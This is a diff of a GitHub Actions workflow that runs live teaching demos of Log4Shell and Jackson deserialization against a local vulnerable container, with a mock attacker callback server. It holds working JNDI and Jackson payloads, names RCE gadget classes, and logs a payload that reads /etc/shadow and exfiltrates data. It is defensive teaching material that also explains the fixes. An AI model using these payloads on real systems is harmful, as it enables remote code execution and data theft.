@@ -39,7 +39,7 @@ jobs:
             sleep 2
           done
 
-      - name: "📖 Demo 1 — Log4Shell"
+      - name: "📖 Demo 1 — Scenario"
         run: |
           source scripts/demo-log.sh
 
@@ -48,15 +48,42 @@ jobs:
 
           **Scenario:** A developer builds a product search API. They log the search query —
           standard practice. The application uses `log4j-core 2.14.1` (Dec 2021, before the patch).
+          HEADER
 
-          ---
+      - name: "🔎 Live baseline — proving this is a real, unpatched victim"
+        run: |
+          source scripts/demo-log.sh
+
+          cat >> "$S" << 'BASELINE_INTRO'
+
+          ### 🔎 Baseline — live `docker exec` against the container this job is running right now
+
+          Not a log excerpt — these commands run against the actual `vuln-app` container, on the
+          actual GitHub Actions runner, before any exploit fires:
+          BASELINE_INTRO
+
+          run_live "docker exec vuln-app id   # On: victim's server" docker exec vuln-app id
+          run_pipe "docker exec vuln-app java -version   # On: victim's server" \
+            "docker exec vuln-app java -version"
+
+          echo "" >> "$S"
+          echo "Confirmed live: the app really runs as **root**, on the JVM this image ships —" >> "$S"
+          echo "exactly the combination that lets Log4Shell go all the way to full compromise." >> "$S"
+          echo "" >> "$S"
+          echo "---" >> "$S"
+
+      - name: "🏢 Victim's server — normal search"
+        run: |
+          source scripts/demo-log.sh
+
+          cat >> "$S" << 'NORMAL_HEADER'
 
           ### 🏢 Victim's server — normal operation
 
           A legitimate user searches for products:
-          HEADER
+          NORMAL_HEADER
 
-          run_json "curl \"http://victim:8080/api/products/search?q=shirt\"" \
+          run_json "curl \"http://victim:8080/api/products/search?q=shirt\"   # On: legitimate user's machine" \
             curl -s "http://localhost:8080/api/products/search?q=shirt"
 
           cat >> "$S" << 'DEV_CODE'
@@ -64,15 +91,22 @@ jobs:
           ```java
           log.info("Product search query: " + q);  // just logging — what could go wrong?
           ```
+          DEV_CODE
+
+      - name: "💀 Attacker's machine — sending the exploit"
+        run: |
+          source scripts/demo-log.sh
+
+          cat >> "$S" << 'ATTACK_HEADER'
 
           ---
 
           ### 💀 Attacker's machine — sending the exploit
 
           The attacker replaces the search term with a JNDI lookup expression:
-          DEV_CODE
+          ATTACK_HEADER
 
-          run_json "curl \"http://victim:8080/api/products/search?q=\${jndi:ldap://attacker:1389/pwned}\"" \
+          run_json "curl \"http://victim:8080/api/products/search?q=\${jndi:ldap://attacker:1389/pwned}\"   # On: attacker's machine" \
             curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D"
 
           cat >> "$S" << 'MECHANICS'
@@ -87,24 +121,65 @@ jobs:
           6. The victim downloads and executes the attacker's malicious Java class
           7. **The attacker now has Remote Code Execution inside the victim's container**
 
-          ---
-
-          ### 📡 Attacker's server — what the attacker sees
-
-          The attacker's LDAP + HTTP server received connections from the victim:
+          Watch it happen live, on both machines, in the next step:
           MECHANICS
 
-          sleep 5
-          run_pipe "docker logs callback   # (filtered to the interesting lines)" \
-            'docker logs callback 2>&1 | grep -E "LDAP lookup|Serving malicious|FILE SERVER|Victim|bytes"'
+      - name: "⏳ Watching it happen — live telemetry from both containers"
+        run: |
+          source scripts/demo-log.sh
 
-          echo "### 🎯 Inside the victim's container — the exploit ran" >> "$S"
-          echo "" >> "$S"
-          echo "The attacker's code executed inside the victim. Here's what it did:" >> "$S"
-          run_pipe "docker logs vuln-app   # (filtered to the interesting lines)" \
-            'docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|Reconnaissance|User:|Hostname:|OS:|Stealing|shadow|Exfiltrat|Privilege escalation|Already root|Modified|read access|outbound|scan the internal|──"'
+          cat >> "$S" << 'WATCH_INTRO'
+
+          ---
+
+          ### ⏳ Watching the attack unfold in real time
+
+          Polling `docker logs` on both running containers, once a second, printing each
+          milestone the instant it appears — the real order of events, not a canned
+          transcript. Each milestone shows two lines: the **raw line the container actually
+          printed** (proof this is really happening), then what it means:
+          WATCH_INTRO
+          echo '```console' >> "$S"
+
+          MARKERS=(
+            "callback|LDAP lookup received|📡 [callback] attacker's LDAP server received the JNDI callback"
+            "callback|Serving malicious|📦 [callback] attacker's HTTP file server served the malicious class"
+            "vuln-app|REMOTE CODE EXECUTION ACHIEVED|💥 [vuln-app] victim loaded the attacker's Java class — RCE confirmed"
+            "vuln-app|Reconnaissance|🔎 [vuln-app] payload starts recon — id, hostname, OS"
+            "vuln-app|password hashes|🔓 [vuln-app] payload read /etc/shadow — proves root access"
+            "vuln-app|data sent to attacker|📤 [vuln-app] stolen recon data POSTed back to the attacker"
+            "callback|/stolen-data|📡 [callback] attacker's server received the exfiltrated data"
+            "vuln-app|Modified /etc/motd|✍️ [vuln-app] payload wrote to /etc/motd — proof of persistence"
+          )
+          declare -A SEEN
+          DONE=0
+
+          for i in $(seq 1 15); do
+            for m in "${MARKERS[@]}"; do
+              IFS='|' read -r CONTAINER PATTERN LABEL <<< "$m"
+              if [ -n "${SEEN[$m]:-}" ]; then continue; fi
+              RAW=$(docker logs "$CONTAINER" 2>&1 | grep -F "$PATTERN" | head -1) || true
+              if [ -n "$RAW" ]; then
+                SEEN[$m]=1
+                {
+                  printf '[+%02ds] %s: %s\n' "$i" "$CONTAINER" "$(echo "$RAW" | sed 's/^ *//')"
+                  printf '[+%02ds]   └─ %s\n' "$i" "$LABEL"
+                } | tee -a "$S"
+              fi
+            done
+            BANNERS=$(docker logs vuln-app 2>&1 | grep -c "══════" || true)
+            if [ "${BANNERS:-0}" -ge 3 ]; then
+              DONE=1
+              printf '[+%02ds] 🏁 payload finished executing inside the victim container\n' "$i" | tee -a "$S"
+              break
+            fi
+            sleep 1
+          done
+          [ "$DONE" -eq 1 ] || echo "⏱️  stopped polling after 15s — showing whatever landed by then" | tee -a "$S"
+          echo '```' >> "$S"
 
           cat >> "$S" << 'CONCLUSION'
+
           ### 💡 Key takeaway
 
           > **The developer did nothing wrong.** They just logged user input — standard practice.
@@ -150,7 +225,7 @@ jobs:
           docker run -d --name vuln-app --add-host=host.docker.internal:host-gateway -p 8080:8080 vuln-app:root
           for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done
 
-      - name: "📖 Demo 2 — Jackson"
+      - name: "📖 Demo 2 — Scenario"
         run: |
           source scripts/demo-log.sh
 
@@ -163,6 +238,13 @@ jobs:
           it, Jackson wraps every value in `["fully.qualified.ClassName", value]` on its own, on both
           sides — nobody hand-writes that shape, it's just what this stack's JSON looks like.
           Application uses `jackson-databind 2.13.4.1`.
+          HEADER
+
+      - name: "🏢 Victim's server — normal use"
+        run: |
+          source scripts/demo-log.sh
+
+          cat >> "$S" << 'NORMAL_HEADER'
 
           ---
 
@@ -170,12 +252,16 @@ jobs:
 
           A legitimate service pushes a profile update (already in the wire format this stack always
           uses — this is not attacker-crafted, it's what `enableDefaultTyping()` produces automatically):
-          HEADER
+          NORMAL_HEADER
 
-          run_json "curl -X POST \"http://victim:8080/api/users/import\" -d '[\"java.util.LinkedHashMap\", {\"name\":\"Alice\",\"email\":\"alice@conf.io\"}]'" \
+          run_json "curl -X POST \"http://victim:8080/api/users/import\" -d '[\"java.util.LinkedHashMap\", {\"name\":\"Alice\",\"email\":\"alice@conf.io\"}]'   # On: legitimate internal service" \
             curl -s -X POST http://localhost:8080/api/users/import \
               -H "Content-Type: application/json" \
               -d '["java.util.LinkedHashMap", {"name":"Alice","email":"alice@conf.io"}]'
+
+      - name: "💀 Attacker's machine — same shape, one field swapped"
+        run: |
+          source scripts/demo-log.sh
 
           cat >> "$S" << 'ATTACK'
 
@@ -191,25 +277,52 @@ jobs:
           client's class name" rule recursively to every nested value, not just the top level.
           ATTACK
 
-          run_json "curl -X POST \"http://victim:8080/api/users/import\" -d '[\"java.util.LinkedHashMap\", {\"name\":\"Alice\",\"email\":[\"java.net.URL\",\"http://attacker:9999/jackson-rce-proof\"]}]'" \
+          run_json "curl -X POST \"http://victim:8080/api/users/import\" -d '[\"java.util.LinkedHashMap\", {\"name\":\"Alice\",\"email\":[\"java.net.URL\",\"http://attacker:9999/jackson-rce-proof\"]}]'   # On: attacker's machine" \
             curl -s -X POST http://localhost:8080/api/users/import \
               -H "Content-Type: application/json" \
               -d '["java.util.LinkedHashMap", {"name":"Alice","email":["java.net.URL","http://host.docker.internal:9999/jackson-rce-proof"]}]'
 
-          echo "The application's own logs already flagged it (defensive type-introspection logging, not a hack):" >> "$S"
-          run_pipe "docker logs vuln-app | grep '\[import\]'" \
+      - name: "🔎 Checking both sides — victim's logs and the attacker's own dashboard"
+        run: |
+          source scripts/demo-log.sh
+
+          cat >> "$S" << 'CHECK_INTRO'
+
+          ---
+
+          ### 🎯 Victim's server — its own logs already flagged it
+
+          Not a hack — defensive type-introspection logging the application does on every
+          `/api/users/import` call:
+          CHECK_INTRO
+
+          run_pipe "docker logs vuln-app | grep '\[import\]'   # On: victim's server" \
             'docker logs vuln-app 2>&1 | grep -E "\[import\]" | tail -6'
 
+          cat >> "$S" << 'DASHBOARD_INTRO'
+
+          ### 📡 Attacker's own dashboard — checked live, right now
+
+          `java.net.URL` doesn't connect on construction, so this specific payload never reaches
+          the attacker's server — the dashboard should still read empty. Proving that live, not
+          just asserting it:
+          DASHBOARD_INTRO
+
+          run_json "curl \"http://attacker:9999/dashboard\"   # On: attacker's machine" \
+            curl -s "http://localhost:9999/dashboard"
+
           cat >> "$S" << 'CONCLUSION'
+
           ### 💡 Key takeaway
 
           > **The `email` field deserialized as `java.net.URL`, not `String` — proof the attacker
           > controlled which Java class got instantiated,** hidden inside a request that otherwise
           > looked exactly like normal internal traffic.
           >
-          > In this demo we used `java.net.URL` (harmless — it doesn't connect on construction). In a
-          > real attack, the attacker uses gadget classes like `JdbcRowSetImpl` (triggers JNDI → RCE)
-          > or `TemplatesImpl` (executes arbitrary bytecode) — same result as Log4Shell.
+          > In this demo we used `java.net.URL` (harmless — it doesn't connect on construction, which
+          > is exactly why the attacker's dashboard above is still empty). In a real attack, the
+          > attacker uses gadget classes like `JdbcRowSetImpl` (triggers JNDI → RCE) or `TemplatesImpl`
+          > (executes arbitrary bytecode) — same result as Log4Shell, and the dashboard would not stay empty.
           >
           > **Fix:** Never use `enableDefaultTyping()`. Use `@JsonTypeInfo` with an explicit allow-list
           > instead. Update jackson-databind to the latest version.
@@ -260,7 +373,7 @@ jobs:
             -p 8080:8080 vuln-app:root
           for i in $(seq 1 30); do curl -s http://localhost:8080/hello > /dev/null 2>&1 && break; sleep 2; done
 
-      - name: "📖 Demo 3 — Full chain on ROOT image"
+      - name: "📖 Demo 3 — Scenario"
         run: |
           source scripts/demo-log.sh
 
@@ -271,25 +384,86 @@ jobs:
           does AFTER getting code execution. Two images compared:
           - 🔴 **Root image** — runs as root, old OS, has gcc/curl/wget
           - 🟢 **Safe image** — runs as non-root, modern OS, no extra tools
+          HEADER
+
+      - name: "🔎 Live baseline — ROOT image, before any exploit runs"
+        run: |
+          source scripts/demo-log.sh
+
+          cat >> "$S" << 'BASELINE_INTRO'
 
           ---
 
-          ### 🔴 Attack on ROOT image
-          HEADER
+          ### 🔎 Baseline — live `docker exec` against the ROOT container, before the exploit fires
+          BASELINE_INTRO
 
-          run_live "curl -o /dev/null -w '%{http_code}\n' \"http://victim:8080/api/products/search?q=\${jndi:ldap://attacker:1389/pwned}\"" \
+          run_live "docker exec vuln-app id   # On: victim's server (ROOT image)" docker exec vuln-app id
+          run_live "docker exec vuln-app ls -l /etc/shadow   # On: victim's server (ROOT image)" \
+            docker exec vuln-app ls -l /etc/shadow
+
+          echo "" >> "$S"
+          echo "Confirmed live: the app runs as **root** and can already read \`/etc/shadow\` —" >> "$S"
+          echo "before a single exploit request has been sent." >> "$S"
+          echo "" >> "$S"
+          echo "---" >> "$S"
+          echo "" >> "$S"
+          echo "### 🔴 Attack on ROOT image" >> "$S"
+
+      - name: "🔴 Attack on ROOT image — watched live"
+        run: |
+          source scripts/demo-log.sh
+
+          run_live "curl -o /dev/null -w '%{http_code}\n' \"http://victim:8080/api/products/search?q=\${jndi:ldap://attacker:1389/pwned}\"   # On: attacker's machine" \
             curl -s -o /dev/null -w '%{http_code}\n' "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D"
-          sleep 6
 
-          echo "#### 🎯 What the attacker's code did inside the ROOT container:" >> "$S"
-          run_pipe "docker logs vuln-app   # (filtered to the interesting lines)" \
-            'docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|Reconnaissance|User:|Hostname:|OS:|Stealing|shadow|root:|Exfiltrat|HTTP|Privilege escalation|Already root|Modified|SSH|create users|pivot|──|\[" | head -30'
+          cat >> "$S" << 'WATCH_INTRO'
 
-          echo "#### 📡 Attacker's server received the stolen data:" >> "$S"
-          run_pipe "docker logs callback | grep -A5 stolen-data" \
-            'docker logs callback 2>&1 | grep -A5 "stolen-data" | head -10'
+          #### ⏳ Watching the ROOT-image compromise unfold in real time
+
+          Same polling technique as Demo 1 — each milestone shows the raw line the container
+          actually printed, then what it means:
+          WATCH_INTRO
+          echo '```console' >> "$S"
+
+          MARKERS=(
+            "callback|LDAP lookup received|📡 [callback] attacker's LDAP server received the JNDI callback"
+            "callback|Serving malicious|📦 [callback] attacker's HTTP file server served the malicious class"
+            "vuln-app|REMOTE CODE EXECUTION ACHIEVED|💥 [vuln-app] victim loaded the attacker's Java class — RCE confirmed"
+            "vuln-app|password hashes|🔓 [vuln-app] payload read /etc/shadow — proves root access"
+            "vuln-app|data sent to attacker|📤 [vuln-app] stolen recon data POSTed back to the attacker"
+            "callback|/stolen-data|📡 [callback] attacker's server received the exfiltrated data"
+            "vuln-app|Already root|👑 [vuln-app] payload confirms it is already root — nothing left to escalate"
+            "vuln-app|Modified /etc/motd|✍️ [vuln-app] payload wrote to /etc/motd — proof of persistence"
+          )
+          declare -A SEEN
+          DONE=0
+
+          for i in $(seq 1 15); do
+            for m in "${MARKERS[@]}"; do
+              IFS='|' read -r CONTAINER PATTERN LABEL <<< "$m"
+              if [ -n "${SEEN[$m]:-}" ]; then continue; fi
+              RAW=$(docker logs "$CONTAINER" 2>&1 | grep -F "$PATTERN" | head -1) || true
+              if [ -n "$RAW" ]; then
+                SEEN[$m]=1
+                {
+                  printf '[+%02ds] %s: %s\n' "$i" "$CONTAINER" "$(echo "$RAW" | sed 's/^ *//')"
+                  printf '[+%02ds]   └─ %s\n' "$i" "$LABEL"
+                } | tee -a "$S"
+              fi
+            done
+            BANNERS=$(docker logs vuln-app 2>&1 | grep -c "══════" || true)
+            if [ "${BANNERS:-0}" -ge 3 ]; then
+              DONE=1
+              printf '[+%02ds] 🏁 payload finished executing inside the victim container\n' "$i" | tee -a "$S"
+              break
+            fi
+            sleep 1
+          done
+          [ "$DONE" -eq 1 ] || echo "⏱️  stopped polling after 15s — showing whatever landed by then" | tee -a "$S"
+          echo '```' >> "$S"
 
           cat >> "$S" << 'ROOT_IMPACT'
+
           > **Impact on ROOT image:** The attacker read `/etc/shadow` (password hashes),
           > modified system files, and exfiltrated data. Full server compromise from a single HTTP request.
 
@@ -316,12 +490,31 @@ jobs:
           Same exploit, same application JAR, but different container configuration:
           HEADER
 
-          run_live "curl -o /dev/null -w '%{http_code}\n' \"http://victim:8080/api/products/search?q=\${jndi:ldap://attacker:1389/pwned}\"   # exact same command as above" \
-            curl -s -o /dev/null -w '%{http_code}\n' "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D"
-          sleep 4
+          run_live "docker exec vuln-app id   # On: victim's server (SAFE image)" docker exec vuln-app id
 
-          echo "#### Result on SAFE image:" >> "$S"
-          run_pipe "docker logs vuln-app | tail -8" 'docker logs vuln-app 2>&1 | tail -8'
+          run_live "curl -o /dev/null -w '%{http_code}\n' \"http://victim:8080/api/products/search?q=\${jndi:ldap://attacker:1389/pwned}\"   # On: attacker's machine — exact same command as above" \
+            curl -s -o /dev/null -w '%{http_code}\n' "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Flog4shell-pwned%7D"
+
+          echo "" >> "$S"
+          echo "#### ⏳ Watching for 5s — does the attacker's Java class load this time?" >> "$S"
+          echo '```console' >> "$S"
+          LOADED=0
+          for i in $(seq 1 5); do
+            RAW=$(docker logs vuln-app 2>&1 | grep -F "REMOTE CODE EXECUTION" | head -1) || true
+            if [ -n "$RAW" ]; then
+              LOADED=1
+              printf '[+%02ds] vuln-app: %s\n' "$i" "$RAW" | tee -a "$S"
+              break
+            fi
+            printf '[+%02ds] vuln-app: (nothing yet)\n' "$i" | tee -a "$S"
+            sleep 1
+          done
+          [ "$LOADED" -eq 1 ] || echo "[+05s] ✅ no RCE marker ever appeared — the class never loaded" | tee -a "$S"
+          echo '```' >> "$S"
+          echo "" >> "$S"
+
+          echo "Actual container output confirming the request was received and handled normally:" >> "$S"
+          run_pipe "docker logs vuln-app | tail -8   # On: victim's server (SAFE image)" 'docker logs vuln-app 2>&1 | tail -8'
 
           cat >> "$S" << 'SAFE_RESULT'
           > **The JNDI lookup is blocked.** Java 25 defaults `com.sun.jndi.ldap.object.trustURLCodebase=false`,
